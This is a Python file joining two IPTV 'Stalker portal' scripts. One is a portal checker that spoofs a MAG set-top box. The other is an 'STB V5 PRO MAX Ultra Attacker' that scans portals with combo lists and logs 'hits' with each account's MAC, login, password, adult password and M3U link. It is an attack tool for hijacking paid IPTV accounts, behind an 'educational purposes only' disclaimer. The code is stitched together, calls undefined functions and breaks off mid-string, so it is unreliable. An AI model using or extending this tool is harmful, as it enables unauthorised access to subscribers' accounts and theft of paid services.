import sys, os

#os.system('cls')

NOME = 'Papy Gogo Checker '
if sys.platform.startswith('win'):
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else:
    sys.stdout.write(f''']2;{NOME}''')
import subprocess
import time

import requests
import urllib3
from urllib3.exceptions import InsecureRequestWarning

urllib3.disable_warnings(InsecureRequestWarning)
urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"

ses = requests.session()

useragent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
BYRimi = "           \x1b[90mᴘʏ ᴄᴏᴅᴇʀ ʙʏ ʀɪᴍɪ \x1b[0m"
STB = "\x1b[0m\n    \x1b[33m══════════════════════════         \n      █▀ ▀█▀ █▄▄   █▀█ █▀█ █▀█       \n      ▄█ ░█░ █▄█   █▀▀ █▀▄ █▄█       \n            \x1b[91mᴘʏ ᴄᴏɴғɪɴɢ ʙʏ ʀɪᴍɪ   \n\x1b[33m     🄵🅁🄴🄴 🄿🄾🅁🅃🄰🄻 🄲🄷🄴🄲🄺🄴🅁              \n    ═══════════PʀᴏV2═══════════         \x1b[0m\n"
WARNNING = "\x1b[91m\n\n   █░█░█ ▄▀█ █▀█ █▄░█ █ █▄░█ █▀▀       \n   ▀▄▀▄▀ █▀█ █▀▄ █░▀█ █ █░▀█ █▄█       \n         \x1b[90m   ᴘʏ ᴄᴏɴғɪɴɢ ʙʏ ʀɪᴍɪ  \x1b[0m\n"
liness = [
    " \x1b[91mThis PY is for educational purposes only.",
    " I am not responsible what you do with it!\x1b[0m",
]


def main():
    print(STB)
    vrdata = ""
    clfe = ""
    clfc = ""
    vrdX = ""
    phpX = ""
    PHPa = ""
    PHPv = ""
    print("          \x1b[32mTYPE IN A PORTAL URL \x1b[0m\n")
    panel = input("\x1b[96m  ◌Portal➥ \x1b[0m\x1b[31m")
    print("\n\x1b[93m            Please wait...  \x1b[0m")
    print("\x1b[0m")
    if panel == "":
        exit()
    if "http://" in panel or "https://" in panel:
        panel = panel.split("://")[1]
    panel = panel.replace("/c/", "")
    panel = panel.replace("/c", "")
    panels = str(panel)
    if "/stalker_portal" in panel:
        panels = panels.replace("/stalker_portal", "")
        panel = panel.replace("/stalker_portal/", "/stalker_portal")
    if "/rmxportal" in panel:
        panels = panels.replace("/rmxportal", "")
        panel = panel.replace("/rmxportal/", "/rmxportal")
    if "/cmdforex" in panel:
        panels = panels.replace("/cmdforex", "")
        panel = panel.replace("/cmdforex/", "/cmdforex")
    if "/portalstb" in panel:
        panels = panels.replace("/portalstb", "")
        panel = panel.replace("/portalstb/", "/portalstb")
    if "/powerfull" in panel:
        panels = panels.replace("/powerfull", "")
        panel = panel.replace("/powerfull/", "/powerfull")
    if "/magaccess" in panel:
        panels = panels.replace("/magaccess", "")
        panel = panel.replace("/magaccess/", "/magaccess")
    if "/maglove" in panel:
        panels = panels.replace("/maglove", "")
        panel = panel.replace("/maglove/", "/maglove")
    panels = panels.replace(" ", "")
    panel = panel.replace(" ", "")
    datc = ""
    reset = 0

    try:
        res = ""
        spanl = str(panel)
        if ":" in spanl:
            spanl = spanl.split(":")[0]
        if "/" in spanl:
            spanl = spanl.split("/")[0]
            spanl = spanl.replace("/", "")
        urlu = "https://iplist.cc/api/" + str(spanl)
        res = ses.get(urlu, timeout=5, verify=None)
        datc = str(res.text)
    except Exception:
        reset = reset + 1
        time.sleep(1)
        if reset == 3:
            res = ""
            datc = ""

    if 'ip": "' in datc:
        servip = ""
        con = ""
        ip = ""

        try:
            ip = datc.split('ip": "')[1].split('"')[0]
            con = datc.split('countryname": "')[1].split('"')[0]
            con = con.replace("United States of America", "United States").replace(
                "United Kingdom of Great Britain and Northern Ireland", "United Kingdom"
            )
        except Exception:
            pass

        servip = f"""\n\x1b[96m    ● ServIP\x1b[0m ➺  \x1b[93m{ip}\x1b[0m ✔️\n\x1b[96m    ● Country\x1b[0m ➺  \x1b[93m{con}\x1b[0m ✔️"""
    else:
        servip = ""
        res = ""
    HEADERA = {
        "User-Agent": useragent,
        "Referer": "http://" + panel + "/c/",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Host": panels,
        "Cookie": "mac=00%3A1A%3A79%3A01%3ACA%3A35; stb_lang=en; timezone=Europe%2FParis;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG250; Link: Ethernet,WiFi",
    }
    phptitle = ""

    try:
        phptitle = str(
            ses.get("http://" + panel + "/c/", headers=HEADERA, timeout=2, verify=None)
            .text.split("<title>")[1]
            .split("<")[0]
            + "\n"
        )
    except Exception:
        pass

    down = ""
    csp = ""
    cse = ""
    ccf = ""
    cpp = ""
    VPN = ""
    cc = ""
    if "NXT" in phptitle or "c/" in phptitle:
        cc = "NXT c/"
    elif "stalker_portal" in phptitle:
        if "stalker_portal/" in phptitle:
            csp = "stalker_portal/"
        cpp = "server/load.php"
        cse = "\n      ╙➛ \x1b[90m[stalker_portal] \x1b[0m"
    elif "portal" in phptitle or "Portal" in phptitle:
        cpp = "portal.php"
        cse = "\n      ╙➛ \x1b[90m[Portal] \x1b[0m"
    elif "Access denied" in phptitle:
        csp = "❌"
        if "cloudflare" in phptitle:
            ccf = "❌"
        elif "server is down" in phptitle:
            down = "down"
        else:
            cse = phptitle.replace("\n", "")
            cse = "\n      ╙➛ \x1b[90m[" + str(cse) + "] \x1b[0m"
    phpdata = ""

    try:
        phpdata = str(
            ses.get(
                "http://" + panel + "/c/xpcom.common.js",
                headers=HEADERA,
                timeout=2,
                verify=None,
            ).text.replace(" ", "")
        )
        phpd = phpdata
        if "+this.portal_ip+'/" in phpdata:
            phpdata = phpdata.split("portal_ip+'/")[1].split("';")[0]
            if "+this.portal_path+'" in phpdata:
                phpdata = phpdata.split("+'/")[1].split("';")[0]
            phpX = "✔️"
        elif "+this.portal_path+'" in phpd:
            phpdata = phpdata.split("+'/")[1].split("';")[0]
            phpX = "✔️"
        elif "c/portal.php" in phpd:
            phpdata = "c/portal.php"
            phpX = "✔️"
        elif "stalker_portal" in phpd:
            phpdata = csp + "server/load.php"
            phpX = "✔️"
        elif "c/server/load.php" in phpd:
            phpdata = "c/server/load.php"
            phpX = "✔️"
        else:
            phpX = "None"
            if phpd == "":
                phpX = "NoX"
            if "CommonXPCOMSTBconstructor" in phpd:
                phpX = "NoM"
            if "403Forbidden" in phpd:
                phpX = "❌"
            if "404 Not Found" in phpd:
                phpX = "❌"
            if "!DOCTYPE" in phpd:
                VPN = "VPN"
        if "cloudflare" in phpd or ccf == "❌":
            clfe = "\x1b[91m[CloudFlare] \x1b[0m"
        phpdata = phpdata.replace("\n", "")
    except Exception:
        pass

    try:
        vrdata = str(
            ses.get(
                "http://" + panel + "/c/version.js",
                headers=HEADERA,
                timeout=2,
                verify=None,
            ).text.replace(" ", "")
        )
        vrd2 = vrdata
        if "ver='" in vrdata:
            vrdata = vrdata.split("ver='")[1].split("';")[0]
            vrdX = "✔️"
        elif "cloudflare" in vrd2 or not (clfe == ""):
            clfc = " \x1b[91m[CloudFlare] \x1b[0m"
            vrdata = "None"
            vrdX = "❌"
        elif "<!DOCTYPE" in vrd2:
            vrdata = "Down⁉"
            vrdX = "❌"
        else:
            vrdX = "❌"
        if vrdata == "":
            vrdX = "❌"
        vrdata = vrdata.replace("\n", "")
        if vrd2 == "":
            vrdX = "❌"
    except Exception:
        pass

    if "XUI" in vrdata and cpp == "portal.php":
        vrdX = "✔️"
        cc = ""
        if not (phpdata == "") or not (phpdata == " "):
            phpdata = f"""c/{phpdata}"""
        else:
            phpdata = "c/portal.php"
    if "stalker_portal" in phptitle and phpdata == "portal.php":
        vrdX = "✔️"
        cc = ""
        phpdata = "server/load.php"
        cpp = "server/load.php"
    if VPN == "VPN":
        VPN = "\n    ❌ \x1b[31mMaybe your IP is Banned!❌ \n   - Tip = Use VPN and try again.\x1b[0m "
    if phpX == "✔️":
        if "portal.php" in phpdata or "load.php" in phpdata:
            PHPa = f"""\x1b[96m    ● PHP\x1b[0m ➺ \x1b[93m {cc + phpdata} \x1b[0m✔️ {cse}{clfe}"""
            if "portal.php" not in PHPa and cpp == "portal.php":
                PHPa = f"""\x1b[96m    ● PHP\x1b[0m ➺ \x1b[93m {cc + cpp} \x1b[0m✔️ {cse}{clfe}"""
            else:
                PHPa = f"""\x1b[96m    ● PHP\x1b[0m ➺ \x1b[93m {csp + phpdata} \x1b[0m✔️ {cse}{clfe}"""
        elif phpX == "None":
            PHPa = f"""\x1b[96m    ● PHP\x1b[0m ➺ \x1b[93m {csp + cc}server/load.php❗ \x1b[0m{clfe}{VPN}"""
            phpX = "✔️"
        elif phpX == "NoX":
            PHPa = f"""\x1b[96m    ● PHP\x1b[0m ➺ \x1b[93m portal.php or c/portal.php \x1b[0m❗ {clfe}{VPN}"""
            phpX = "✔️"
        elif phpX == "NoM":
            PHPa = f"""\x1b[96m    ● PHP\x1b[0m ➺ \x1b[93m {cc}portal.php \x1b[0m❗ {clfe}{VPN}"""
            phpX = "✔️"
        else:
            PHPa = "    ❌ \x1b[31m ERROR! Server may be Down⁉ \n     Tip = Use VPN and try again. \x1b[0m"
    if vrdX == "✔️":
        PHPv = f"""\x1b[96m    ● Version\x1b[0m ➺ \x1b[93m {vrdata} \x1b[0m✔️{clfc}"""
    else:
        PHPv = f"""\x1b[96m    ● Version\x1b[0m ➺ \x1b[93m None⁉ \x1b[0m❌{clfc}"""
    #os.system('cls')
    print(STB)
    if down == "down":
        down = "\n        ❌  \x1b[31mServer may be Down⁉\x1b[0m ❌ "
    if phpX == "❌":
        print(
            f"""\x1b[96m    ● Host\x1b[0m ➺ \x1b[93m {panels} \x1b[0m❌ {down}{VPN}{servip}\n"""
        )
        print(PHPa)
    else:
        print("    \x1b[32m👇PORTAL DATA CHECKED RESULT ARE👇  \x1b[0m\n\n")
        print(
            f"""\x1b[96m    ● Host\x1b[0m ➺ \x1b[93m {panels} \x1b[0m✔️ {down}{servip}"""
        )
        print(PHPv)
        print(PHPa)
    panel2 = input(
        "\n\n"
        + str(BYRimi)
        + "\n      ○ \x1b[31mTo NEXT = PRESS ENTER \x1b[0m\n            \x1b[36mAɴsᴡᴇʀ =\x1b[31m "
    )
    print("\x1b[90m")
    if panel2 == "0":
        time.sleep(0.1)


if __name__ == "__main__":
    main()

import os,pip
import datetime,os
import socket,hashlib
from colorama import Fore, Back, Style
#from playsound import playsound 
try:
    import urllib
except:
    pip.main([
        'install',
        'urllib'])
import json,random,sys, time,re,platform                      
hits='/Users/dumancan/Desktop/hits'

import os
if not os.path.exists(hits):
    os.mkdir(hits) 
try:
  import androidhelper as sl4a
  ad = sl4a.Android()
except:pass
import subprocess
try:
  import threading
except:pass
import pathlib
try:
  import requests
except:
  print("modulo de solicitado no encontrado \n solicitando la instalación del módulo ahora... \n")
  pip.main(['install', 'requests'])
import requests
try:
  import sock
except:
  print("modulo sock no encontrado \n instalando modulo sock ahora... \n")
  pip.main(['install', 'requests[socks]'] )
  pip.main(['install', 'sock'] )
  pip.main(['install', 'socks'] )
  pip.main(['install', 'PySocks'] )
import sock
my_os = platform.system()
if (my_os == "Windows"):
    rootDir = "./"
    my_os = "Wɪɴᴅᴏᴡs"
else:
    rootDir = "/Users/dumancan/"
    my_os = "macOS"
my_cpu = platform.machine()
my_py = platform.python_implementation()

proxy_dir = os.path.join(rootDir, 'Proxy')
if not os.path.exists(proxy_dir):
    os.makedirs(proxy_dir)
getmac=""
oto=0
tur=0
Seri=""
csay=0
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from uuid import getnode as get_mac
from urllib.parse import urlsplit
#mac = "1102274947"#str(get_mac())
try:
  import cfscrape
  sesq= requests.Session()
  ses = cfscrape.create_scraper(sess=sesq)
except:
  ses= requests.Session()
logging.captureWarnings(True)

os.makedirs(rootDir+'/proxy/', exist_ok=True)
os.makedirs(rootDir+'/sounds/', exist_ok=True)
os.makedirs(rootDir+'/hits/𝐒𝐓𝐁√5𝐏𝐑𝐎/𝐅𝐔𝐋𝐋/', exist_ok=True)
os.makedirs(rootDir+'/hits/𝐒𝐓𝐁√5𝐏𝐑𝐎/𝐒𝐇𝐎𝐑𝐓/', exist_ok=True)
os.makedirs(rootDir+'/hits/𝐒𝐓𝐁√5𝐏𝐑𝐎/𝐌𝐀𝐂𝐬/', exist_ok=True)

url="http://topbgtv.free.bg/FIKO_DIRECTORY/STBMAX5.mp3"
urllib.request.urlretrieve(url,rootDir+"sounds/STBMAX5.mp3")
NAME = 'STBV5 PRO MAX'
sys.stdout.write(f"\033]2;{NAME}\007")


say1=0
say2=0
say=0
yanpanel="hata" 
imzayan="" 
bul=0
hitc=0
prox=0
cpm=0
pattern = r"(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
anonym=""
os.system('clear')


from time import sleep

print(r"""\33[90m         _____ _______ _____ _____"" 
        / ____|_______|  __ (_____) 
       ( (___    | |  | |__) )____  
        \___ \   | |  |  __ (____ \ 
        ____) )  | |  | |__) )___) ) 
       (_____/   |_|  |_____(_____/ 
             ᴘʏ ᴄᴏɴꜰɪɢ ʙʏ ʀɪᴍɪ      \n
\33[91m              Please wait... \33[0m""")
 
# Waiting for 5 seconds to clear the screen
sleep(1)
 
# Clearing the Screen
os.system('clear')

def a(z):
  for e in z + '\n':
    sys.stdout.write(e)
    sys.stdout.flush()
    time.sleep(0.01)
a("""\n 
\33[91m     █░█░█ ▄▀█ █▀█ █▄░█ █ █▄░█ █▀▀      
     ▀▄▀▄▀ █▀█ █▀▄ █░▀█ █ █░▀█ █▄█        \33[0m\n\33[90m              ᴘʏ ᴄᴏɴꜰɪɢ ʙʏ ʀɪᴍɪ \33[0m\n\n\33[91m This PY is for educational purposes only \n I am not responsible what you do whit it! \n \033[1;32m        PRESS ENTER IF YOU AGREE! \33[0m""")
time.sleep(1)
input("")
os.system('clear')

import os
from time import sleep
 
# some text
print("""\33[33;7m ★     ★     ★   PREMIUM  ★     ★     ★    \33[0m

\x1b[38;5;226m        █▀ ▀█▀ █▄▄  █▀█ █▀█ █▀█           \33[0m
\x1b[38;5;226m        ▄█ ░█░ █▄█  █▀▀ █▀▄ █▄█           \33[0m
\33[91m             ᴘʏ ᴄᴏɴꜰɪɢ ʙʏ ʀɪᴍɪ     
\x1b[38;5;226m════════════════V5═══════════════════      

\33[91m          Activation check...🛡         \33[0m """)
 
 
sleep(2)
os.system('clear')
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def _urlsplit(url):
    return urlsplit(re.sub(r'^(http(s?):\/\/)?', 'http\\2://', url))

def get_flag(country_code):
    flag = ''
    try:
        for letter in country_code:
            flag += unicodedata.lookup(f'REGIONAL INDICATOR SYMBOL LETTER {letter}')
    except:
        pass
    return flag 

def full_link(ar, url):
    return url._replace(netloc = ar).geturl()

def remove_color_ansi(txt):
    return re.sub(r'\33[0m', '', txt, 0, re.MULTILINE)

def user_pick(options, prompt='Select', returnIndex=False, rePrompt=False):
  """Show user selection prompt"""
  le = len(options)
  if rePrompt:
    print('\033[1F\033[K', end='')
  else:
    for idx, element in enumerate(options):
      print(f"    \33[1m\033[38;5;160m{idx + 1}\033[0m \33[1m\033[0;92m= \33[1m\033[33m{element}")
    print('')

  i = input(f"{prompt} ")
  try:
    i = int(i)
    if 0 < i <= le:
      return i-1 if returnIndex else options[i-1]
    else: raise Exception()
  except:
    return user_pick(options, prompt, returnIndex, True)

def dolookup(url):
    try:
        out = ''
        ses = requests.session()
        api = f'https://iplist.cc/api/{url.hostname}'
        res = json.loads(ses.get(api, timeout=(10)).text)
        #print(res)
        if not res.get('error'):
            out = f"""
 \33[1m\033[38;5;020m╓➙Host: {url.hostname}   \033[38;5;113m
 \33[1m\033[38;5;020m╙➙ \033[33mHTTP \033[38;5;020mProtocol ➙ Host \033[0;92m ONLINE

 \33[1m\033[0;32m╓This is the correct Sub-Portal
 ╙ \33[1m\033[38;5;129mhttp://{url.hostname}/c/

\33[1m\033[33m ╓Trying to collect Portal DATA 
\33[1m\033[33m ╠[Server IP \033[33m| \033[38;5;129m{res.get("ip")} \033[33m] 
\33[1m\033[33m ╠[\033[0;32mCountry➙{res.get("countryname")} {get_flag(res.get("countrycode"))} \033[33m]  
\33[1m\033[33m ╙\033[38;5;246mDomains ⟱\033[38;5;117m
"""

            #for site in res.get('website'): print(f'  {site}')
            alt_domains = list(map(lambda ids: full_link(ids, url), res.get('website')));
            for site in alt_domains: out += f'  {site}\n'
        return out

    except:
        print(f'\nError: Failed to lookup: {url.hostname}')

def singlelookup():
    out = dolookup(_urlsplit(input('\n \33[36m\33[1m\33[1m ○Portal⮕ \x1b[38;5;1m\33[1m ')))
    print(out)
    
def filelookup():
  script_dir = os.path.abspath(os.path.dirname(__file__))
  file_list = [name for name in os.listdir(script_dir) if name.endswith('.txt')]
  exec_filename = os.path.join(script_dir, user_pick(file_list, 'Select file to upload and check'))
  out = ''
  with open(exec_filename, 'r', encoding='UTF-8') as file:
    line = file.readline().rstrip()
    while (line):
    #while (line := file.readline().rstrip()):
        line = file.readline().rstrip()
        single = dolookup(_urlsplit(line))
        print(single)
        out += single

  if (input('\nSave results to file? (y/N)')+'N')[0].upper()=='Y':
    with open('reverse_lookup.txt', 'w', encoding='UTF-8') as file:
        file.write(remove_color_ansi(out))
 

def getMode():
    while True:
        mode = input().lower()
        if mode in '3'.split():
            return mode
        elif mode == "Continue":
            break
print(r"""\33[3m\33[90m  ★      ★      ★      ★      ★      ★     \33[0m\x1b[38;5;226m""     _______      _                 _"" 
    |_   __ \    (_)               (_)  
      | |__) |   __   _ .--..--.   __   
      |  __ /   [  | [ `.-. .-. | [  |  
     _| |  \ \_  | |  | | | | | |  | |  
    |____| |___|[___][___||__||__][___]  \33[0m

\33[36m\33[1m          🛡  🅂🅃🄱 V5 🄼🄰🅇  🛡           \33[0m
\x1b[38;5;1m\33[1m         Ⓤⓛⓣⓡⓐ🔸ⒶⓉⓉⒶⒸⓀⒺⓇ          \33[0m
\33[1m\x1b[38;5;231m           ☛ ᴘʏ ᴄᴏɴꜰɪɢ ʙʏ ʀɪᴍɪ ☚ \33[0m

\33[3m\33[90m        MULTI STB5 PRO MAX PREMIUM         \33[0m\n""")
mode = user_pick((' Check  domain/IP',' Load the domains/IP file ',' Continue '),'\33[1m\033[38;5;160m    Choose = \033[0;32m',returnIndex=True)
if mode == 0: singlelookup()
elif mode == 1: filelookup()
elif mode == 3: getMode()
input() 

sleep(2)
os.system('clear')
anonym = r"""\\33[3m\\33[90m  ★      ★      ★      ★      ★      ★     \\33[0m""
\x1b[38;5;226m     _______      _                 _"" 
    |_   __ \    (_)               (_)  
      | |__) |   __   _ .--..--.   __   
      |  __ /   [  | [ `.-. .-. | [  |  
     _| |  \ \_  | |  | | | | | |  | |  
    |____| |___|[___][___||__||__][___]  \33[0m

\33[36m\33[1m          🛡  🅂🅃🄱 V5 🄼🄰🅇  🛡           \33[0m
\x1b[38;5;1m\33[1m         Ⓤⓛⓣⓡⓐ🔸ⒶⓉⓉⒶⒸⓀⒺⓇ          \33[0m
\33[1m\x1b[38;5;231m           ☛ ᴘʏ ᴄᴏɴꜰɪɢ ʙʏ ʀɪᴍɪ ☚ \33[0m

\33[3m\33[90m        MULTI STB5 PRO MAX PREMIUM         \33[0m"""
#print(anonym) 
global m3uinfo
m3uinfo=""
global kate
kate=""
global envivo
envivo=0
global peliculas
peliculas=0
global series
series=0
global juanka
juanka=""
global current_time
global hora_inicio
global hora_ini
time_= time.localtime()
current_time = time.strftime("%d %m %Y - %H:%M:%S", time_)
hora_ini = time.strftime("%H:%M:%S", time_)
vpnz2=""
cpm=0
cpmx=0
hitr=0
m3uon=0
m3uvpn=0
macon=0
macvpn=0


  
bot=0
hit=0
hitr="\33[33m"
tokenr="\33[0m"
oran=""
def bekle(bib,vr):
  i=bib
  
  animation = [ '\x1b[36m●●●○○○○○○○○○○○○○○○○○○○\x1b[91m', '\x1b[36m●●●●●●●○○○○○○○○○○○○○○○\x1b[91m', '\x1b[36m●●●●●●●●●●●●●●●○○○○○○○\x1b[91m', '\x1b[36m●●●●●●●●●○○○○○○○○○○○○○\x1b[91m', '\x1b[36m●●●●●●●●●●●●●●○○○○○○○○\x1b[91m', '\x1b[36m●●●●●●●●●●○○○○○○○○○○○○\x1b[91m', '\x1b[36m●●●●●●●●●●●●○○○○○○○○○○\x1b[91m', '\x1b[36m●●●●●●●●●●●●●○○○○○○○○○\x1b[91m', '\x1b[36m●●●●●●●●●●●●●●●●●●●○○○\x1b[91m', '\x1b[36m●●●●●●●●●○○○○○○○○○○○○○\x1b[91m', '\x1b[36m●●●●●●●●●●○○○○○○○○○○○○\x1b[91m', '\x1b[36m●●●●●●●●●●●●●●●●●○○○○○\x1b[91m', '\x1b[36m●●●●●●●●○○○○○○○○○○○○○○\x1b[91m', '\x1b[36m●●●●●●●●●●●●○○○○○○○○○○\x1b[91m', '\x1b[36m●●●●●●●●●●●●●●●●●●●●●○\x1b[91m' ]
  #for i in range(len(animation)):
  time.sleep(0.5)
  sys.stdout.write("\r"'   \33[92m\33[1m♻️Pʀᴏx \33[0m\x1b[38;5;1m\33[1m['  + animation[ i % len(animation)]+'\x1b[38;5;1m\33[1m]\33[92m\33[1mCʜᴇᴄᴋ \33[0m')
  sys.stdout.flush()
  #print('\n')      
  
kanalkata="2"
stalker_portal="anonym"
def hityaz(mac,trh,real,m3ulink,m3uimage,durum,vpn,kanalsayisi,filmsayisi,dizisayisi,livelist,vodlist,serieslist,playerapi,fname,tariff_plan,ls,login,password,tariff_plan_id,bill,expire_billing_date,max_online,parent_password,stb_type,comment,country,settings_password,adult,scountry,country_name):
  global hitr,hitsay
  panell=panel
  reall=real
  if 'anonym' == 'anonym':#try:
    simza=""
    if uzmanm=="stalker_portal/server/load.php":
      panell=str(panel)+'/stalker_portal'
      reall=real.replace('/c/','/stalker_portal/c/')
      simza="""
       
╓❪❪❪ 𝑺𝑻𝑨𝑳𝑲𝑬𝑹 🕵️ 𝑰𝑵𝑭𝑶 ❫❫❫
║∘Lᴏɢɪɴ➛ """+login+"""
║∘Usᴇʀɴᴀᴍᴇ➛ """+fname+"""
║∘Pᴀssᴡᴏʀᴅ➛ """+password+"""
║∘Aᴅᴜʟᴛ Pᴀssᴡᴏʀᴅ➛ """+parent_password+"""
║∘Tᴀʀɪꜰꜰ Iᴅ➛ """+tariff_plan_id+"""
║∘Tᴀʀɪꜰꜰ Pʟᴀɴ➛ """+tariff_plan+"""
║∘Mᴀx Oɴʟɪɴᴇ➛ """+max_online+"""
╠━✪ 𝐏𝐲 𝐒𝐓𝐁ꜰʀᴇᴇ𝐏𝐫𝐞𝐦𝐢𝐮𝐦 ✪
╠═⊛ Hɪᴛs ʙʏ ☞ """+str(nickn)+""" ☜
║∘Sᴛʙ Tʏᴘᴇ➛ """+stb_type+"""
║∘Cᴏᴜɴᴛʀʏ➛ """+country+"""
║∘Sᴇᴛᴛɪɴɢꜱ Pᴀꜱꜱᴡᴏʀᴅ➛ """+settings_password+"""
║∘Cᴏᴍᴍᴇɴᴛ➛ """+comment+""" 
╚⫸[ 𝐒𝐓𝐁√ˣ𝐏𝐑𝐎彡𝐅𝐫𝐞𝐞#𝐏𝐫𝐞𝐦𝐢𝐮𝐦 ]"""
    imza="""
🎩▂▂▂▂✬𝐀𝐋𝐁🐉𝐒𝐓𝐁✬▂▂▂▂🎩
╓❪❪❪ƧƬƁ √𝟻 ꜰʀᴇᴇ ❦ ƤƦЄMƖƲM❫❫❫
║◌Rᴇᴀʟ➛"""+str(reall)+"""
║◌Pᴀɴᴇʟ➛http://"""+str(panell)+"""/c/
║∘Mᴀᴄ➛ """+str(mac)+"""
║∘Exᴘ➛ """+str(trh)+"""
║∘Tʏᴘᴇ➛ """+str(uzmanm)+"""➚⁽ˢᵀᴮˣ⁾
║∘Aɢᴇɴᴛ➛ sᴛʙ⁵ᴀᴜᴛᴏ-ᴀɢᴇɴᴛX
║∘Aᴛᴛᴀᴄᴋ➛ sᴛʙ⁵ᴀᴜᴛᴏ-ᴀᴛᴛᴀᴄᴋ
║∘Cᴏᴍʙᴏ➛ """+str(combodosya)+"""
╠═⊛ Hɪᴛs ʙʏ ☞ """+str(nickn)+""" ☜
╟✷FREE👇🏼𝐒𝐓𝐁ᴍᴀx𝐏𝐫𝐞𝐦𝐢𝐮𝐦
║∘Sᴛʙᴘʟʏᴇʀ➛𝖮𝗍𝗍,𝖲𝗍𝖻𝖤𝗆𝗎,𝖲𝗍𝖺𝗅𝗄𝖾𝗋
║∘Pᴄᴘʟʏᴇ➛𝖲𝖿𝗏𝗂𝗉,𝖲𝗍𝖺𝗅𝗄𝖾𝗋,𝖯𝗈𝗍𝖯𝗅𝖺𝗒𝖾
╚⫸[ 𝐒𝐓𝐁√⁵𝐏𝐑𝐎彡𝐅𝐫𝐞𝐞#𝐏𝐫𝐞𝐦𝐢𝐮𝐦 ]

╓❪❪❪ 𝐌𝟑𝐔 🏋️ 𝑷𝑹𝑬𝑴𝑰𝑼𝑴 ❫❫❫
╠═⊛ Hɪᴛs ʙʏ ☞ """+str(nickn)+""" ☜
║∘NᴇᴇᴅVᴘɴ➛  """+str(durum)+"""
║☞ᴍзᴜꜱᴛᴀᴛᴜꜱ➛ """+m3uimage+"""
║∘Vᴘɴ """+str(vpn)+"""
║∘Rᴇɢɪᴏɴ➛ """+str(country_name)+""" """+data_server(str(scountry))+""" 
╙➛"""+str(m3ulink)+""" """+str(playerapi)+""" """
    sifre=device(mac)
    
    pimza=""""""
    imza=imza+sifre+simza+pimza
    if len(kanalsayisi) > 1:
      imza=imza+"""

╓❪❪❪ 𝑴𝑬𝑫𝑰𝑨 📺 𝑪𝑶𝑼𝑵𝑻 ❫❫❫
║∘Cʜᴀɴɴᴇʟꜱ➛"""+kanalsayisi+"""
║∘Vᴏᴅ➛"""+filmsayisi+"""
║∘Sᴇʀɪᴇꜱ➛"""+dizisayisi+""" 
╚⫸[ 𝐒𝐓𝐁√⁵𝐏𝐑𝐎彡𝐅𝐫𝐞𝐞#𝐏𝐫𝐞𝐦𝐢𝐮𝐦 ]"""
    if  kanalkata=="1" or kanalkata=="2":
      imza=imza+""" 
      
╓❪❪❪ 𝑳𝑰𝑽𝑬 ⚜️ 𝑳𝑰𝑺𝑻 ❫❫❫
╚⫸"""+str(livelist)+""" ««◌»» """
    if kanalkata=="2":
      imza=imza+"""  
╓❪❪❪ 𝑽𝑶𝑫 🔅 𝑳𝑰𝑺𝑻 ❫❫❫
╚⫸"""+str(vodlist)+"""  ««◌»» 
╓❪❪❪ 𝑺𝑬𝑹𝑰𝑬𝑺 ⚜️ 𝑳𝑰𝑺𝑻 ❫❫❫
╚⫸"""+str(serieslist)+""" ««◌»» """
    imza=imza+"""

╓❪❪❪ 𝑺𝑪𝑨𝑵𝑵𝑰𝑵𝑮 🔅 𝑰𝑵𝑭𝑶 ❫❫❫▬ι══ﺤ
║🥷 Hɪᴛs ʙʏ ☞ """+str(nickn)+""" ☜
║🧛‍♀️‍ HɪᴛTɪᴍᴇ: """+str(time.strftime('%H:%M / %d.%m.%Y'))+"""
║⚔️ 𝐒𝐓𝐁 𝐕𝟓 𝐌𝐚𝐱 ✶ 𝐔𝐩𝐝𝐚𝐭𝐞:33
║🥇 #𝐏𝐫𝐞𝐦𝐢𝐮𝐦𝐏𝐲𝐅𝐫𝐞𝐞 ღ  ʙʏ ʀɪᴍɪ
║▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂


"""

    imza=imza
    yax(imza)
    hitsay=hitsay+1
    #print(imza)
    if hitsay >= hit:
      hitr="\33[33m"
  #except:pass
    
    
    cimza="""
🎩▂▂▂▂✬𝐀𝐋𝐁🐉𝐒𝐓𝐁✬▂▂▂▂🎩
╓❪❪❪ƧƬƁ √𝟻 ꜰʀᴇᴇ ❦ ƤƦЄMƖƲM❫❫❫
║◌Pᴀɴᴇʟ➛http://"""+str(panell)+"""/c/
